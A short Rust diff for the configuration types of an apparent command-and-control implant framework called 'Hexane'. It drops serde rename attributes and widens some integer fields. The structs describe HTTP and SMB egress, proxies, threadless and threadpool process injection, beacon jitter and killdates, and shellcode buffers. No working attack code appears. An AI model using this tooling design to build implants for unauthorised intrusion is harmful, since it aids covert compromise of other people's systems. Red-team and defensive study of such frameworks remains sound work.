@@ -41,14 +41,12 @@ pub struct Args {
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename_all = "lowercase")]
 pub enum Network {
     Http(Http),
     Smb(Smb),
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename_all = "lowercase")]
 pub enum Injection {
     Threadless(ThreadlessInject),
     Threadpool(ThreadpoolInject),
@@ -68,14 +66,12 @@ pub struct ThreadpoolInject{
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename = "smb")]
 pub struct Smb {
     pub(crate) egress_pipe: String,
     pub(crate) egress_peer: String,
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename = "http")]
 pub struct Http {
     pub(crate) address:    String,
     pub(crate) port:       u16,
@@ -87,7 +83,6 @@ pub struct Http {
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename = "proxy")]
 pub struct Proxy {
     pub(crate) address:    String,
     pub(crate) proto:      String,
@@ -97,7 +92,6 @@ pub struct Proxy {
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename = "config")]
 pub struct Config {
     pub(crate) debug:          bool,
     pub(crate) encrypt:        bool,
@@ -106,11 +100,10 @@ pub struct Config {
     pub(crate) working_hours:  Option<String>,
     pub(crate) killdate:       Option<String>,
     pub(crate) sleeptime:      u32,
-    pub(crate) jitter:         u8,
+    pub(crate) jitter:         u32,
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename = "builder")]
 pub struct Builder {
     pub(crate) output_name:            String,
     pub(crate) root_directory:         String,
@@ -121,7 +114,6 @@ pub struct Builder {
 }
 
 #[derive(Serialize, Deserialize, Debug)]
-#[serde(rename = "loader")]
 pub struct Loader {
     pub(crate) root_directory: String,
     pub(crate) linker_script:  String,
@@ -166,8 +158,8 @@ pub struct UserSession {
 pub struct Hexane {
     pub(crate) current_taskid:  u32,
     pub(crate) peer_id:         u32,
-    pub(crate) group_id:        i32,
-    pub(crate) build_type:      i32,
+    pub(crate) group_id:        u32,
+    pub(crate) build_type:      u32,
 
     pub(crate) crypt_key:       Vec<u8>,
     pub(crate) shellcode:       Vec<u8>,
